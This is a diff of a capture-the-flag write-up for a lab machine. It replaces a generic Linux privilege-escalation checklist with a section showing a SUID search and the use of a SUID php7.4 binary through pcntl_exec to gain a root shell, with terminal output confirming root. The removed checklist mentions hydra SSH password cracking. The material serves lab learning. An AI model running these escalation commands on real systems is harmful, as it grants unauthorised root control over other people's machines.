@@ -144,47 +144,33 @@ www-data@gravity:~/html/grav-admin$
 
 ---
 
-- [ ] Upgrade to TTY Shell
+## Check SUID Permissions
+
+Checking SUID bit for interesting files we see _/usr/bin/php7.4_ and should be able to get a root shell by exploiting this.
+
+![gtfo](../../../assets/images/ctfs/proving_grounds/astronaut/gtfo.png)
 
 ```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-ctrl+z
-stty size
-stty raw -echo
-fg
-stty rows <first_value>
-stty cols <second_value>
-export TERM=xterm-256color
+www-data@gravity:/dev/shm$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/su
+/usr/bin/fusermount
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/php7.4
+/usr/bin/gpasswd
+www-data@gravity:/dev/shm$ CMD="/bin/bash"
+CMD="/bin/bash"
+www-data@gravity:/dev/shm$ /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
+</usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+whoami
+root
+
 ```
-
-- [ ] sudo -l
-- [ ] enumerate users
-- [ ] SUID/GUID
-
-```bash
-find / -perm -u=s -type f 2>/dev/null
-find / -perm -g=s -type f 2>/dev/null
-```
-
-- [ ] enumerate process running with root privileges
-
-```bash
-ps -aux | grep -i 'root'
-```
-
-- [ ] enumerate network services
-
-```bash
-netstat -antup (ss -tunlp)
-```
-
-- [ ] check for extended capabilities
-
-```bash
-getcap -r / 2>/dev/null
-```
-
-- [ ] test discovered credentials against all users
-- [ ] attempt hydra ssh password crack for discovered users
-- [ ] check _/opt_, _/tmp_, _/var/tmp_, _/etc_, and _/dev/shm_
-- [ ] Check if /etc/passwd is writeable
